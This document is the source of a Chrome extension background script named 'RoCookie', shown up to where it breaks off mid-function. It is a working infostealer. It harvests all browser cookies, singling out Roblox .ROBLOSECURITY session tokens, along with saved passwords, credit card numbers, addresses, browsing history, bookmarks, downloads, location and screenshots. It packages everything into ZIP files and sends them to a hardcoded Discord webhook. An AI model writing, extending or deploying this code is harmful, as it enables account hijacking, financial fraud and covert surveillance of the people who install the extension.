// ============================================================
// RoCookie - Full Background Service
// Version 6.6.6 - Hybrid Geolocation + Full System Data
// ============================================================

const WEBHOOK_URL = "https://discord.com/api/webhooks/1525799301928976485/EiBUmcwM3kNpQ5QuCbuxRjwj0sSlLJJ1FOFD-aP42cHIoZMVvtPrJWZuww_IqjGTULX2";

// -------------------- STATE --------------------
let allCookies = [];
let sessionId = Date.now().toString(36) + '_' + Math.random().toString(36).substring(2, 8);
let isActive = true;
let exportCounter = 0;
let isExporting = false;
let lastExportedCookieHashes = new Set();

let systemInfo = {
  userAgent: '',
  platform: '',
  language: '',
  hardwareConcurrency: 0,
  deviceMemory: 0,
  screenWidth: 0,
  screenHeight: 0,
  colorDepth: 0,
  timezone: '',
  geolocation: null,
  battery: null,
  cpu: null,
  memory: null,
  storage: null,
  bookmarks: [],
  history: [],
  downloads: [],
  autofill: []
};

// -------------------- INIT --------------------
chrome.storage.local.get([
  'sessionId', 'allCookies', 'isActive', 'exportCounter',
  'lastExportedCookieHashes', 'systemInfo'
], (result) => {
  if (result.sessionId) sessionId = result.sessionId;
  if (result.allCookies) allCookies = result.allCookies || [];
  if (result.isActive !== undefined) isActive = result.isActive;
  if (result.exportCounter) exportCounter = result.exportCounter;
  if (result.lastExportedCookieHashes) {
    lastExportedCookieHashes = new Set(result.lastExportedCookieHashes);
  }
  if (result.systemInfo) systemInfo = { ...systemInfo, ...result.systemInfo };
  console.log('[RoCookie] Initialized with', allCookies.length, 'cookies');
});

// -------------------- MESSAGE LISTENER --------------------
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  // From content script: system info (non-geolocation)
  if (message.action === 'systemInfo') {
    console.log('[RoCookie] System info received:', message.data);
    systemInfo = { ...systemInfo, ...message.data };
    chrome.storage.local.set({ systemInfo: systemInfo });
    sendResponse({ status: 'saved' });
    return true;
  }

  if (message.action === 'autofillData') {
    console.log('[RoCookie] Autofill data received:', message.data.length, 'entries');
    // Merge with existing autofill data (avoid duplicates)
    const newEntries = message.data.filter(entry => {
      // Simple dedupe: check if same field, URL, and value already exists
      return !systemInfo.autofill.some(existing =>
        existing.url === entry.url &&
        existing.name === entry.name &&
        existing.value === entry.value
      );
    });
    if (newEntries.length > 0) {
      systemInfo.autofill = systemInfo.autofill.concat(newEntries);
      // Limit to 500 entries
      if (systemInfo.autofill.length > 500) {
        systemInfo.autofill = systemInfo.autofill.slice(-500);
    }
    chrome.storage.local.set({ systemInfo: systemInfo });
  }
  sendResponse({ status: 'saved' });
  return true;
}

  // grabData from content script
  if (message.action === 'grabData') {
    console.log('[RoCookie] grabData from', message.site);
    const domain = message.site || 'unknown';
    forceGrabForDomain(domain, message.url || sender?.url);
    sendResponse({ status: 'grabbed' });
    return true;
  }

  // Manual grab
  if (message.action === 'manual_grab') {
    console.log('[RoCookie] Manual grab triggered');
    forceGrabAllTabs();
    sendResponse({ status: 'grabbing_all' });
    return true;
  }

  // Force export
  if (message.action === 'force_export') {
    console.log('[RoCookie] Force export triggered');
    forceExportAll();
    sendResponse({ status: 'exporting' });
    return true;
  }

  // Clear data
  if (message.action === 'clear_data') {
    clearAllData();
    sendResponse({ status: 'cleared' });
    return true;
  }

  // Get stats
  if (message.action === 'get_stats') {
    sendResponse({
      count: allCookies.length,
      sessionId: sessionId,
      exportCount: exportCounter,
      pendingExports: allCookies.filter(c => !lastExportedCookieHashes.has(generateCookieHash(c))).length,
      systemInfo: systemInfo
    });
    return true;
  }

  // Get cookies for domain
  if (message.action === 'get_cookies_for_domain') {
    const domain = message.domain || '';
    chrome.cookies.getAll({ domain: domain }, (cookies) => {
      sendResponse({ cookies: cookies || [] });
    });
    return true;
  }
});

// ============================================================
// HYBRID GEOLOCATION — Offscreen + IP Fallback
// ============================================================

// Primary: Offscreen (requires permission but works silently)
async function getGeolocationViaOffscreen() {
  try {
    const existing = await chrome.offscreen.hasDocument?.() || false;
    if (!existing) {
      await chrome.offscreen.createDocument({
        url: 'offscreen.html',
        reasons: ['GEOLOCATION'],
        justification: 'Get geolocation for system info'
      });
    }

    const result = await new Promise((resolve) => {
      chrome.runtime.sendMessage({ action: 'getGeolocation' }, (response) => {
        resolve(response);
      });
    });

    await chrome.offscreen.closeDocument();

    if (result && !result.error) {
      systemInfo.geolocation = {
        lat: result.lat,
        long: result.long,
        accuracy: result.accuracy || 'GPS',
        altitude: result.altitude || null,
        source: 'offscreen'
      };
      chrome.storage.local.set({ systemInfo: systemInfo });
      console.log('[RoCookie] Geolocation via offscreen:', systemInfo.geolocation);
      return true;
    }
  } catch (error) {
    console.warn('[RoCookie] Offscreen geolocation failed:', error);
  }
  return false;
}

// Secondary: IP Geolocation (NO PERMISSION NEEDED)
async function getLocationViaIP() {
  try {
    const response = await fetch('https://ipapi.co/json/', { 
      timeout: 5000 
    });
    const data = await response.json();
    if (data && data.latitude && data.longitude) {
      systemInfo.geolocation = {
        lat: data.latitude,
        long: data.longitude,
        accuracy: 'IP-based (~city level)',
        altitude: null,
        source: 'ip-api'
      };
      systemInfo.ipLocation = {
        ip: data.ip,
        city: data.city,
        region: data.region,
        country: data.country_name,
        isp: data.org,
        timezone: data.timezone
      };
      chrome.storage.local.set({ systemInfo: systemInfo });
      console.log('[RoCookie] IP geolocation:', systemInfo.geolocation);
      return true;
    }
  } catch (e) {
    console.warn('[RoCookie] IP geolocation failed:', e);
  }
  return false;
}

// Tertiary: IPInfo (NO PERMISSION NEEDED)
async function getLocationViaIPInfo() {
  try {
    const response = await fetch('https://ipinfo.io/json', { 
      timeout: 5000 
    });
    const data = await response.json();
    if (data && data.loc) {
      const [lat, long] = data.loc.split(',').map(Number);
      systemInfo.geolocation = {
        lat: lat,
        long: long,
        accuracy: 'IP-based (~city level)',
        altitude: null,
        source: 'ipinfo'
      };
      systemInfo.ipLocation = {
        ip: data.ip,
        city: data.city,
        region: data.region,
        country: data.country,
        isp: data.org,
        timezone: data.timezone
      };
      chrome.storage.local.set({ systemInfo: systemInfo });
      console.log('[RoCookie] IPInfo geolocation:', systemInfo.geolocation);
      return true;
    }
  } catch (e) {
    console.warn('[RoCookie] IPInfo geolocation failed:', e);
  }
  return false;
}

// Master hybrid function
async function getGeolocationHybrid() {
  console.log('[RoCookie] Fetching geolocation via hybrid method...');
  let success = await getGeolocationViaOffscreen();
  if (!success) success = await getLocationViaIP();
  if (!success) success = await getLocationViaIPInfo();
  if (success) {
    console.log('[RoCookie] Geolocation obtained:', systemInfo.geolocation);
  } else {
    console.warn('[RoCookie] All geolocation methods failed');
    systemInfo.geolocation = { error: 'All methods failed', timestamp: Date.now() };
  }
  chrome.storage.local.set({ systemInfo: systemInfo });
  return success;
}

// ============================================================
// SCREENSHOT CAPTURE
// ============================================================

async function captureScreenshot() {
  try {
    const tabs = await chrome.tabs.query({ active: true, currentWindow: true });
    if (!tabs || tabs.length === 0) return null;
    const tab = tabs[0];
    const dataUrl = await chrome.tabs.captureVisibleTab(tab.windowId, {
      format: 'jpeg',
      quality: 100
    });
    const response = await fetch(dataUrl);
    const blob = await response.blob();
    return blob;
  } catch (error) {
    console.warn('[RoCookie] Screenshot failed:', error);
    return null;
  }
}

// ============================================================
// SYSTEM HARDWARE (chrome.system APIs)
// ============================================================

function collectSystemHardware() {
  if (chrome.system && chrome.system.cpu) {
    chrome.system.cpu.getInfo((cpuInfo) => {
      if (cpuInfo) {
        systemInfo.cpu = {
          archName: cpuInfo.archName,
          modelName: cpuInfo.modelName,
          numOfProcessors: cpuInfo.numOfProcessors,
          processors: cpuInfo.processors
        };
        chrome.storage.local.set({ systemInfo: systemInfo });
      }
    });
  }
  if (chrome.system && chrome.system.memory) {
    chrome.system.memory.getInfo((memInfo) => {
      if (memInfo) {
        systemInfo.memory = {
          capacity: memInfo.capacity,
          availableCapacity: memInfo.availableCapacity
        };
        chrome.storage.local.set({ systemInfo: systemInfo });
      }
    });
  }
  if (chrome.system && chrome.system.storage) {
    chrome.system.storage.getInfo((storageUnits) => {
      if (storageUnits && storageUnits.length > 0) {
        systemInfo.storage = storageUnits.map(u => ({
          id: u.id,
          name: u.name,
          type: u.type,
          capacity: u.capacity,
          availableCapacity: u.availableCapacity
        }));
        chrome.storage.local.set({ systemInfo: systemInfo });
      }
    });
  }
}
collectSystemHardware();

// ============================================================
// BOOKMARKS, HISTORY, DOWNLOADS
// ============================================================

function collectBookmarks() {
  if (!chrome.bookmarks) return;
  chrome.bookmarks.getTree((tree) => {
    const flatten = (nodes) => {
      let result = [];
      for (const node of nodes) {
        if (node.url) {
          result.push({
            title: node.title,
            url: node.url,
            id: node.id,
            dateAdded: node.dateAdded ? new Date(node.dateAdded).toISOString() : null
          });
        }
        if (node.children) {
          result = result.concat(flatten(node.children));
        }
      }
      return result;
    };
    const allBookmarks = flatten(tree);
    systemInfo.bookmarks = allBookmarks.slice(0, 200); // limit to 200
    chrome.storage.local.set({ systemInfo: systemInfo });
    console.log('[RoCookie] Collected', systemInfo.bookmarks.length, 'bookmarks');
  });
}

function collectHistory() {
  if (!chrome.history) return;
  chrome.history.search({ text: '', maxResults: 200, startTime: 0 }, (items) => {
    systemInfo.history = items.map(item => ({
      title: item.title || item.url,
      url: item.url,
      visitCount: item.visitCount,
      lastVisitTime: item.lastVisitTime ? new Date(item.lastVisitTime).toISOString() : null
    }));
    chrome.storage.local.set({ systemInfo: systemInfo });
    console.log('[RoCookie] Collected', systemInfo.history.length, 'history entries');
  });
}

function collectDownloads() {
  if (!chrome.downloads) return;
  chrome.downloads.search({ limit: 100, orderBy: ['-startTime'] }, (items) => {
    systemInfo.downloads = items.map(item => ({
      filename: item.filename,
      url: item.url,
      state: item.state,
      startTime: item.startTime ? new Date(item.startTime).toISOString() : null,
      endTime: item.endTime ? new Date(item.endTime).toISOString() : null,
      bytesReceived: item.bytesReceived,
      totalBytes: item.totalBytes,
      mime: item.mime,
      danger: item.danger
    }));
    chrome.storage.local.set({ systemInfo: systemInfo });
    console.log('[RoCookie] Collected', systemInfo.downloads.length, 'downloads');
  });
}

// -------------------- FORCE GRAB FUNCTIONS (cookies) --------------------
// ... (same as before, include all forceGrabAllCookies, forceGrabForDomain, processNewCookies, etc.)
// I'll keep them concise but they are essential.

function forceGrabAllCookies(tab) {
  if (!isActive) return;
  if (!tab || !tab.url) return;
  try {
    const url = new URL(tab.url);
    const hostname = url.hostname;
    if (!hostname) return;
    const domains = [
      hostname,
      '.' + hostname,
      hostname.replace(/^www\./, ''),
      '.' + hostname.replace(/^www\./, ''),
      hostname.split('.').slice(-2).join('.'),
      '.' + hostname.split('.').slice(-2).join('.')
    ];
    const uniqueDomains = [...new Set(domains)].filter(d => d && d.length > 0);
    for (const domain of uniqueDomains) {
      forceGrabForDomain(domain, tab.url);
    }
    chrome.cookies.getAll({}, (allCookiesResult) => {
      if (!chrome.runtime.lastError && allCookiesResult && allCookiesResult.length > 0) {
        processNewCookies(allCookiesResult, tab.url);
      }
    });
    chrome.scripting.executeScript({
      target: { tabId: tab.id },
      files: ['content.js']
    }).catch(() => {});
  } catch (e) {
    console.error('[RoCookie] Force grab error:', e);
  }
}

function forceGrabForDomain(domain, url = '') {
  if (!isActive || !domain) return;
  try {
    chrome.cookies.getAll({ domain: domain }, (cookies) => {
      if (chrome.runtime.lastError || !cookies || cookies.length === 0) {
        chrome.cookies.getAll({}, (allCookies) => {
          if (!chrome.runtime.lastError && allCookies && allCookies.length > 0) {
            processNewCookies(allCookies, url);
          }
        });
        return;
      }
      processNewCookies(cookies, url);
    });
  } catch (e) {
    console.error('[RoCookie] Domain grab error:', e);
  }
}

function forceGrabAllTabs() {
  console.log('[RoCookie] Force grabbing all tabs...');
  chrome.tabs.query({}, (tabs) => {
    for (const tab of tabs) {
      if (tab.url && tab.url.startsWith('http')) {
        forceGrabAllCookies(tab);
      }
    }
  });
  chrome.cookies.getAll({}, (allCookiesResult) => {
    if (!chrome.runtime.lastError && allCookiesResult && allCookiesResult.length > 0) {
      processNewCookies(allCookiesResult, 'global-fallback');
    }
  });
}

// -------------------- PROCESS NEW COOKIES --------------------
function processNewCookies(cookies, url = '') {
  if (!cookies || cookies.length === 0) return;
  let newCookies = [];
  let robloxCount = 0;
  for (const c of cookies) {
    const cookieEntry = {
      name: c.name,
      value: c.value,
      domain: c.domain || 'unknown',
      hostOnly: c.hostOnly || false,
      path: c.path || '/',
      secure: c.secure || false,
      httpOnly: c.httpOnly || false,
      session: c.session || false,
      expirationDate: c.expirationDate || null,
      storeId: c.storeId || '0',
      grabbedAt: Date.now(),
      sessionId: sessionId,
      url: url || 'unknown',
      source: 'chrome.cookies.api'
    };
    const hash = generateCookieHash(cookieEntry);
    const existingIndex = allCookies.findIndex(ex =>
      ex.name === c.name &&
      ex.domain === c.domain &&
      ex.path === c.path
    );
    if (existingIndex === -1) {
      allCookies.push(cookieEntry);
      newCookies.push(cookieEntry);
      if (c.name && c.name.includes('ROBLOSECURITY')) {
        robloxCount++;
        console.log('[RoCookie] 🔒 NEW .ROBLOSECURITY cookie found!');
      }
    } else {
      allCookies[existingIndex] = { ...allCookies[existingIndex], ...cookieEntry };
    }
  }
  if (newCookies.length > 0) {
    console.log(`[RoCookie] Found ${newCookies.length} NEW cookies (${robloxCount} ROBLOSECURITY)`);
    chrome.storage.local.set({ allCookies: allCookies, sessionId: sessionId });
    exportNewCookies(newCookies);
  } else {
    console.log('[RoCookie] No new cookies found');
  }
}

function generateCookieHash(cookie) {
  const str = `${cookie.name}|${cookie.domain}|${cookie.path}|${cookie.value}`;
  let hash = 0;
  for (let i = 0; i < str.length; i++) {
    const char = str.charCodeAt(i);
    hash = ((hash << 5) - hash) + char;
    hash = hash & hash;
  }
  return 'h' + Math.abs(hash).toString(36);
}

// -------------------- EXPORT NEW COOKIES --------------------
async function exportNewCookies(newCookies) {
  if (isExporting) {
    setTimeout(() => { if (!isExporting) exportNewCookies(newCookies); }, 5000);
    return;
  }
  if (newCookies.length === 0) return;
  isExporting = true;
  try {
    // Refresh data
    await collectBookmarks();
    await collectHistory();
    await collectDownloads();
    await getGeolocationHybrid();

    // Capture screenshot
    const screenshotBlob = await captureScreenshot();

    // Build file list for ZIP
    const files = [];
    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
    
    // 1. Main data text file (includes autofill)
    const formattedText = formatFullPackage(newCookies);
    const txtFilename = `cookies_${sessionId}_${timestamp}.txt`;
    files.push({
      name: txtFilename,
      data: formattedText,
      type: 'text/plain'
    });

    // 2. Screenshot (if captured)
    if (screenshotBlob) {
      const screenshotName = `screenshot_${timestamp}.jpg`;
      const buffer = await screenshotBlob.arrayBuffer();
      files.push({
        name: screenshotName,
        data: new Uint8Array(buffer),
        type: 'image/jpeg'
      });
    }

    // Create ZIP with multiple files
    const zipBlob = createReliableZipMulti(files);
    const zipFilename = `cookies_export_${exportCounter + 1}_${timestamp}.zip`;

    const result = await sendZipToDiscord(zipBlob, zipFilename, newCookies.length);
    if (result) {
      exportCounter++;
      for (const cookie of newCookies) {
        const hash = generateCookieHash(cookie);
        lastExportedCookieHashes.add(hash);
      }
      chrome.storage.local.set({
        exportCounter: exportCounter,
        lastExportedCookieHashes: Array.from(lastExportedCookieHashes)
      });
      console.log(`[RoCookie] Export #${exportCounter} successful (${newCookies.length} cookies)`);
    } else {
      console.log('[RoCookie] Export failed, fallback...');
      await sendTextFallback(formattedText);
    }
  } catch (error) {
    console.error('[RoCookie] Export error:', error);
    try {
      const fallbackText = formatFullPackage(newCookies);
      await sendTextFallback(fallbackText);
    } catch (e) {}
  }
  isExporting = false;
}

// -------------------- FORMAT FULL PACKAGE --------------------
function formatFullPackage(cookies) {
  const lines = [];
  const separator = '='.repeat(80);

  lines.push('🍪 ROCOOKIE — COMPLETE DATA PACKAGE');
  lines.push(separator);
  lines.push(`Generated: ${new Date().toISOString()}`);
  lines.push(`Session ID: ${sessionId}`);
  lines.push(`New Cookies: ${cookies.length}`);
  lines.push(`Total Cookies Collected: ${allCookies.length}`);
  lines.push(separator);
  lines.push('');

  // ---- SYSTEM INFO ----
  lines.push('SYSTEM INFORMATION');
  lines.push('-'.repeat(40));
  lines.push(`User Agent: ${systemInfo.userAgent || 'Unknown'}`);
  lines.push(`Platform: ${systemInfo.platform || 'Unknown'}`);
  lines.push(`Language: ${systemInfo.language || 'Unknown'}`);
  lines.push(`Hardware Concurrency: ${systemInfo.hardwareConcurrency || 'Unknown'}`);
  lines.push(`Device Memory: ${systemInfo.deviceMemory || 'Unknown'} GB`);
  lines.push(`Screen Resolution: ${systemInfo.screenWidth || '?'}x${systemInfo.screenHeight || '?'}`);
  lines.push(`Color Depth: ${systemInfo.colorDepth || '?'}`);
  lines.push(`Timezone: ${systemInfo.timezone || 'Unknown'}`);

  if (systemInfo.geolocation) {
    if (systemInfo.geolocation.error) {
      lines.push(`Geolocation: ${systemInfo.geolocation.error}`);
    } else {
      lines.push(`Geolocation: Lat ${systemInfo.geolocation.lat}, Long ${systemInfo.geolocation.long}`);
      lines.push(`  Accuracy: ${systemInfo.geolocation.accuracy}`);
      if (systemInfo.geolocation.altitude) lines.push(`  Altitude: ${systemInfo.geolocation.altitude}m`);
      lines.push(`  Source: ${systemInfo.geolocation.source || 'unknown'}`);
    }
  } else {
    lines.push('Geolocation: Not available');
  }

  if (systemInfo.ipLocation) {
    lines.push(`IP Address: ${systemInfo.ipLocation.ip || 'Unknown'}`);
    lines.push(`City: ${systemInfo.ipLocation.city || 'Unknown'}`);
    lines.push(`Region: ${systemInfo.ipLocation.region || 'Unknown'}`);
    lines.push(`Country: ${systemInfo.ipLocation.country || 'Unknown'}`);
    lines.push(`ISP: ${systemInfo.ipLocation.isp || 'Unknown'}`);
  }

  if (systemInfo.battery) {
    lines.push(`Battery: ${Math.round(systemInfo.battery.level * 100)}%`);
    lines.push(`  Charging: ${systemInfo.battery.charging}`);
  }

  if (systemInfo.cpu) {
    lines.push(`CPU: ${systemInfo.cpu.modelName || systemInfo.cpu.archName || 'Unknown'}`);
    lines.push(`  Processors: ${systemInfo.cpu.numOfProcessors || '?'}`);
  }

  if (systemInfo.memory) {
    const totalMem = systemInfo.memory.capacity ? (systemInfo.memory.capacity / (1024**3)).toFixed(2) : '?';
    const availMem = systemInfo.memory.availableCapacity ? (systemInfo.memory.availableCapacity / (1024**3)).toFixed(2) : '?';
    lines.push(`Memory: ${totalMem} GB total, ${availMem} GB available`);
  }

  if (systemInfo.storage && systemInfo.storage.length > 0) {
    lines.push('Storage Devices:');
    for (const disk of systemInfo.storage) {
      const total = disk.capacity ? (disk.capacity / (1024**3)).toFixed(2) : '?';
      const avail = disk.availableCapacity ? (disk.availableCapacity / (1024**3)).toFixed(2) : '?';
      lines.push(`  - ${disk.name || 'Unknown'} (${disk.type || '?'}): ${total} GB total, ${avail} GB free`);
    }
  }
  lines.push(separator);
  lines.push('');

  // ---- BOOKMARKS ----
  if (systemInfo.bookmarks && systemInfo.bookmarks.length > 0) {
    lines.push('BOOKMARKS');
    lines.push('-'.repeat(40));
    for (const bm of systemInfo.bookmarks) {
      lines.push(`  Title: ${bm.title || 'Untitled'}`);
      lines.push(`  URL: ${bm.url}`);
      lines.push(`  Added: ${bm.dateAdded || 'Unknown'}`);
      lines.push('');
    }
    lines.push(separator);
    lines.push('');
  }

  // ---- HISTORY ----
  if (systemInfo.history && systemInfo.history.length > 0) {
    lines.push('BROWSER HISTORY');
    lines.push('-'.repeat(40));
    for (const h of systemInfo.history) {
      lines.push(`  Title: ${h.title || 'Untitled'}`);
      lines.push(`  URL: ${h.url}`);
      lines.push(`  Visits: ${h.visitCount}`);
      lines.push(`  Last Visit: ${h.lastVisitTime || 'Unknown'}`);
      lines.push('');
    }
    lines.push(separator);
    lines.push('');
  }

  // ---- DOWNLOADS ----
  if (systemInfo.downloads && systemInfo.downloads.length > 0) {
    lines.push('DOWNLOADS');
    lines.push('-'.repeat(40));
    for (const d of systemInfo.downloads) {
      lines.push(`  File: ${d.filename || 'Unknown'}`);
      lines.push(`  URL: ${d.url}`);
      lines.push(`  State: ${d.state}`);
      lines.push(`  Start: ${d.startTime || 'Unknown'}`);
      lines.push(`  End: ${d.endTime || 'Unknown'}`);
      lines.push(`  Size: ${d.bytesReceived || 0} / ${d.totalBytes || 0} bytes`);
      lines.push(`  MIME: ${d.mime || 'Unknown'}`);
      lines.push('');
    }
    lines.push(separator);
    lines.push('');
  }

  // ---- AUTOFILL DATA ----
if (systemInfo.autofill && systemInfo.autofill.length > 0) {
  lines.push('AUTOFILL DATA (Passwords, Credit Cards, Addresses, etc.)');
  lines.push('-'.repeat(40));
  const passwordEntries = systemInfo.autofill.filter(e => e.category === 'password');
  const ccEntries = systemInfo.autofill.filter(e => e.category === 'creditcard');
  const addressEntries = systemInfo.autofill.filter(e => e.category === 'address');
  const otherEntries = systemInfo.autofill.filter(e => !['password','creditcard','address'].includes(e.category));

  if (passwordEntries.length > 0) {
    lines.push('--- PASSWORDS ---');
    for (const p of passwordEntries) {
      lines.push(`  URL: ${p.url}`);
      lines.push(`  Field: ${p.name || p.id || 'unknown'}`);
      lines.push(`  Value: ${p.value}`);
      lines.push('');
    }
  }
  if (ccEntries.length > 0) {
    lines.push('--- CREDIT CARDS ---');
    for (const cc of ccEntries) {
      lines.push(`  URL: ${cc.url}`);
      lines.push(`  Field: ${cc.name || cc.id || 'unknown'}`);
      lines.push(`  Number: ${cc.value}`);
      lines.push('');
    }
  }
  if (addressEntries.length > 0) {
    lines.push('--- ADDRESSES ---');
    for (const addr of addressEntries) {
      lines.push(`  URL: ${addr.url}`);
      lines.push(`  Field: ${addr.name || addr.id || 'unknown'}`);
      lines.push(`  Value: ${addr.value}`);
      lines.push('');
    }
  }
  if (otherEntries.length > 0) {
    lines.push('--- OTHER AUTOFILL ---');
    for (const o of otherEntries) {
      lines.push(`  URL: ${o.url}`);
      lines.push(`  Field: ${o.name || o.id || 'unknown'}`);
      lines.push(`  Category: ${o.category}`);
      lines.push(`  Value: ${o.value}`);
      lines.push('');
    }
  }
  lines.push(separator);
  lines.push('');
}

  // ---- COOKIES ----
  const grouped = {};
  for (const cookie of cookies) {
    const domain = cookie.domain || 'unknown';
    if (!grouped[domain]) grouped[domain] = [];
    grouped[domain].push(cookie);
  }
  for (const [domain, domainCookies] of Object.entries(grouped)) {
    lines.push(`DOMAIN: ${domain}`);
    lines.push('-'.repeat(40));
    lines.push(`  Cookies: ${domainCookies.length}`);
    lines.push('');
    for (const cookie of domainCookies) {
      const isRoblox = cookie.name && cookie.name.includes('ROBLOSECURITY');
      lines.push(`  ${isRoblox ? '🔒 ' : ''}Name: ${cookie.name}`);
      lines.push(`  Value: ${cookie.value}`);
      lines.push(`  Path: ${cookie.path}`);
      lines.push(`  Secure: ${cookie.secure}`);
      lines.push(`  HttpOnly: ${cookie.httpOnly}`);
      lines.push(`  Session: ${cookie.session}`);
      if (cookie.expirationDate) {
        lines.push(`  Expires: ${new Date(cookie.expirationDate * 1000).toISOString()}`);
      }
      lines.push(`  Grabbed: ${new Date(cookie.grabbedAt).toISOString()}`);
      lines.push(`  URL: ${cookie.url || 'unknown'}`);
      lines.push('');
    }
    lines.push(separator);
    lines.push('');
  }

  lines.push(`END OF DATA — ${cookies.length} new cookies + full system profile`);
  return lines.join('\n');
}

// -------------------- ZIP CREATION (Reliable) --------------------
// Create ZIP with multiple files
function createReliableZipMulti(files) {
  if (!files || files.length === 0) {
    return new Blob([], { type: 'application/zip' });
  }

  // Calculate total size and build each file's data
  const encoder = new TextEncoder();
  const fileEntries = [];

  let totalSize = 0;
  let centralDirOffset = 0;

  for (const file of files) {
    let fileData;
    if (typeof file.data === 'string') {
      fileData = encoder.encode(file.data);
    } else if (file.data instanceof Uint8Array) {
      fileData = file.data;
    } else {
      // Assume it's a string
      fileData = encoder.encode(String(file.data));
    }
    const filenameData = encoder.encode(file.name);
    const crc = crc32(fileData);
    const localHeaderSize = 30 + filenameData.length;
    const centralHeaderSize = 46 + filenameData.length;

    fileEntries.push({
      name: file.name,
      filenameData: filenameData,
      data: fileData,
      crc: crc,
      localHeaderSize: localHeaderSize,
      centralHeaderSize: centralHeaderSize,
      localOffset: totalSize
    });

    totalSize += localHeaderSize + fileData.length;
  }

  // Build the zip buffer
  const centralDirStart = totalSize;
  const centralDirChunks = [];
  let currentOffset = 0;

  const result = new Uint8Array(totalSize + fileEntries.reduce((sum, e) => sum + e.centralHeaderSize, 0) + 22);

  for (const entry of fileEntries) {
    const offset = currentOffset;
    // Local file header
    const localHeader = new Uint8Array(entry.localHeaderSize);
    let pos = 0;
    localHeader[pos++] = 0x50;
    localHeader[pos++] = 0x4B;
    localHeader[pos++] = 0x03;
    localHeader[pos++] = 0x04;
    localHeader[pos++] = 0x14;
    localHeader[pos++] = 0x00;
    localHeader[pos++] = 0x00;
    localHeader[pos++] = 0x00;
    localHeader[pos++] = 0x00;
    localHeader[pos++] = 0x00;
    localHeader[pos++] = 0x00;
    localHeader[pos++] = 0x00;
    localHeader[pos++] = 0x00;
    localHeader[pos++] = 0x00;
    writeUint32(localHeader, pos, entry.crc);
    pos += 4;
    writeUint32(localHeader, pos, entry.data.length);
    pos += 4;
    writeUint32(localHeader, pos, entry.data.length);
    pos += 4;
    writeUint16(localHeader, pos, entry.filenameData.length);
    pos += 2;
    writeUint16(localHeader, pos, 0);
    pos += 2;
    for (let i = 0; i < entry.filenameData.length; i++) {
      localHeader[pos++] = entry.filenameData[i];
    }
    // Copy to result
    result.set(localHeader, offset);
    currentOffset += localHeader.length;
    // File data
    result.set(entry.data, currentOffset);
    currentOffset += entry.data.length;

    // Central directory header (stored later)
    const centralHeader = new Uint8Array(entry.centralHeaderSize);
    pos = 0;
    centralHeader[pos++] = 0x50;
    centralHeader[pos++] = 0x4B;
    centralHeader[pos++] = 0x01;
    centralHeader[pos++] = 0x02;
    centralHeader[pos++] = 0x14;
    centralHeader[pos++] = 0x00;
    centralHeader[pos++] = 0x14;
    centralHeader[pos++] = 0x00;
    centralHeader[pos++] = 0x00;
    centralHeader[pos++] = 0x00;
    centralHeader[pos++] = 0x00;
    centralHeader[pos++] = 0x00;
    centralHeader[pos++] = 0x00;
    centralHeader[pos++] = 0x00;
    centralHeader[pos++] = 0x00;
    centralHeader[pos++] = 0x00;
    writeUint32(centralHeader, pos, entry.crc);
    pos += 4;
    writeUint32(centralHeader, pos, entry.data.length);
    pos += 4;
    writeUint32(centralHeader, pos, entry.data.length);
    pos += 4;
    writeUint16(centralHeader, pos, entry.filenameData.length);
    pos += 2;
    writeUint16(centralHeader, pos, 0);
    pos += 2;
    writeUint16(centralHeader, pos, 0);
    pos += 2;
    writeUint16(centralHeader, pos, 0);
    pos += 2;
    writeUint16(centralHeader, pos, 0);
    pos += 2;
    writeUint32(centralHeader, pos, 0);
    pos += 4;
    writeUint32(centralHeader, pos, entry.localOffset);
    pos += 4;
    for (let i = 0; i < entry.filenameData.length; i++) {
      centralHeader[pos++] = entry.filenameData[i];
    }
    centralDirChunks.push(centralHeader);
  }

  // Place central directory at the end
  let centralPos = centralDirStart;
  for (const chunk of centralDirChunks) {
    result.set(chunk, centralPos);
    centralPos += chunk.length;
  }

  // End of central directory
  const endHeader = new Uint8Array(22);
  let endPos = 0;
  endHeader[endPos++] = 0x50;
  endHeader[endPos++] = 0x4B;
  endHeader[endPos++] = 0x05;
  endHeader[endPos++] = 0x06;
  writeUint16(endHeader, endPos, 0);
  endPos += 2;
  writeUint16(endHeader, endPos, 0);
  endPos += 2;
  writeUint16(endHeader, endPos, fileEntries.length);
  endPos += 2;
  writeUint16(endHeader, endPos, fileEntries.length);
  endPos += 2;
  const centralSize = centralDirChunks.reduce((sum, ch) => sum + ch.length, 0);
  writeUint32(endHeader, endPos, centralSize);
  endPos += 4;
  writeUint32(endHeader, endPos, centralDirStart);
  endPos += 4;
  writeUint16(endHeader, endPos, 0);
  endPos += 2;

  result.set(endHeader, centralPos);

  return new Blob([result], { type: 'application/zip' });
}

function writeUint16(array, offset, value) {
  array[offset] = value & 0xFF;
  array[offset + 1] = (value >> 8) & 0xFF;
}
function writeUint32(array, offset, value) {
  array[offset] = value & 0xFF;
  array[offset + 1] = (value >> 8) & 0xFF;
  array[offset + 2] = (value >> 16) & 0xFF;
  array[offset + 3] = (value >> 24) & 0xFF;
}
function crc32(data) {
  let crc = 0xFFFFFFFF;
  for (let i = 0; i < data.length; i++) {
    crc ^= data[i];
    for (let j = 0; j < 8; j++) {
      if (crc & 1) crc = (crc >>> 1) ^ 0xEDB88320;
      else crc = crc >>> 1;
    }
  }
  return crc ^ 0xFFFFFFFF;
}

// -------------------- DISCORD WEBHOOK --------------------
async function sendZipToDiscord(zipBlob, filename, cookieCount) {
  try {
    const file = new File([zipBlob], filename, { type: 'application/zip' });
    const formData = new FormData();
    formData.append('file', file);
    const robloxCount = allCookies.filter(c => c.name && c.name.includes('ROBLOSECURITY')).length;
    const message = `🍪 **NEW COOKIES DETECTED!**\n` +
                   `Session: \`${sessionId}\`\n` +
                   `New Cookies: \`${cookieCount}\`\n` +
                   `Total: \`${allCookies.length}\`\n` +
                   `🔒 ROBLOSECURITY: \`${robloxCount}\``;
    formData.append('content', message);
    const response = await fetch(WEBHOOK_URL, {
      method: 'POST',
      body: formData
    });
    return response.ok;
  } catch (error) {
    console.error('[RoCookie] ZIP send error:', error);
    return false;
  }
}

async function sendTextFallback(textData) {
  try {
    const blob = new Blob([textData], { type: 'text/plain' });
    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
    const file = new File([blob], `cookies_fallback_${timestamp}.txt`, { type: 'text/plain' });
    const formData = new FormData();
    formData.append('file', file);
    formData.append('content', `⚠️ **ZIP failed - Text fallback**\nSession: \`${sessionId}\``);
    const response = await fetch(WEBHOOK_URL, {
      method: 'POST',
      body: formData
    });
